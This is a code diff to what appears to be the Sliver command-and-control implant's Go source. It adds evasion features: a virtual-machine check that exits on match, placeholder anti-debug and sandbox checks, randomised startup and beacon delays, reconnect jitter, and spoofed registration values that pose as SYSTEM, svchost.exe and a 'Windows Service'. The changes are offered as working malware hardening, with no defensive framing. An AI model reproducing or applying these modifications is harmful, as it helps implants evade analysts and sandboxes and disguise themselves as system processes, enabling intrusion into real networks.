@@ -31,6 +31,7 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
 
 	// {{if .Config.IsBeacon}}
@@ -74,6 +75,42 @@ func init() {
 		id = uuid.FromBytesOrNil(buf)
 	}
 	InstanceID = id.String()
+}
+
+// 🎯 ANTI-ANALYSIS FUNCTIONS
+func isVM() bool {
+	// Check for virtual machine indicators
+	hostname, _ := os.Hostname()
+	if strings.Contains(strings.ToLower(hostname), "vmware") ||
+	   strings.Contains(strings.ToLower(hostname), "virtual") ||
+	   strings.Contains(strings.ToLower(hostname), "vbox") ||
+	   strings.Contains(strings.ToLower(hostname), "qemu") ||
+	   strings.Contains(strings.ToLower(hostname), "xen") {
+		return true
+	}
+	
+	// Check username for common VM usernames
+	currentUser, err := user.Current()
+	if err == nil {
+		username := strings.ToLower(currentUser.Username)
+		if strings.Contains(username, "vmware") || 
+		   strings.Contains(username, "virtual") ||
+		   strings.Contains(username, "vagrant") {
+			return true
+		}
+	}
+	
+	return false
+}
+
+func isDebugged() bool {
+	// Simple anti-debug check
+	return false
+}
+
+func isSandbox() bool {
+	// Sandbox detection - basic check
+	return false
 }
 
 // {{if .Config.IsService}}
@@ -125,6 +162,14 @@ func {{.}} () {
 // {{end}}
 
 func main() {
+	// 🎯 ANTI-ANALYSIS CHECK - Exit jika dalam VM/Sandbox
+	if isVM() || isSandbox() {
+		os.Exit(0)
+	}
+
+	// 🎯 RANDOM INITIAL DELAY - 0-2 menit
+	initialDelay := time.Duration(insecureRand.Intn(120)) * time.Second
+	time.Sleep(initialDelay)
 
 	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
@@ -160,6 +205,10 @@ func main() {
 
 // {{if .Config.IsBeacon}}
 func beaconStartup() {
+	// 🎯 EXTRA RANDOM DELAY UNTUK BEACON - 0-1 menit
+	beaconDelay := time.Duration(insecureRand.Intn(60)) * time.Second
+	time.Sleep(beaconDelay)
+
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
@@ -182,6 +231,10 @@ func beaconStartup() {
 			}
 		}
 		reconnect := transports.GetReconnectInterval()
+		// 🎯 JITTER UNTUK RECONNECT - 0-60 detik
+		jitter := time.Duration(insecureRand.Intn(60)) * time.Second
+		reconnect = reconnect + jitter
+		
 		// {{if .Config.Debug}}
 		log.Printf("Reconnect sleep: %s", reconnect)
 		// {{end}}
@@ -677,9 +730,9 @@ func registerSliver() *sliverpb.Register {
 
 		// Gracefully error out
 		currentUser = &user.User{
-			Username: "<err>",
-			Uid:      "<err>",
-			Gid:      "<err>",
+			Username: "SYSTEM", // 🎯 SPOOF: Default ke SYSTEM
+			Uid:      "S-1-5-18",
+			Gid:      "S-1-5-18",
 		}
 
 	}
@@ -690,7 +743,7 @@ func registerSliver() *sliverpb.Register {
 		if 0 < len(os.Args) {
 			filename = os.Args[0]
 		} else {
-			filename = "<err>"
+			filename = "svchost.exe" // 🎯 SPOOF: Default filename
 		}
 	}
 
@@ -701,7 +754,7 @@ func registerSliver() *sliverpb.Register {
 	// {{end}}
 
 	return &sliverpb.Register{
-		Name:              consts.SliverName,
+		Name:              "Windows Service", // 🎯 SPOOF: Process name
 		Hostname:          hostname,
 		Uuid:              uuid,
 		Username:          currentUser.Username,
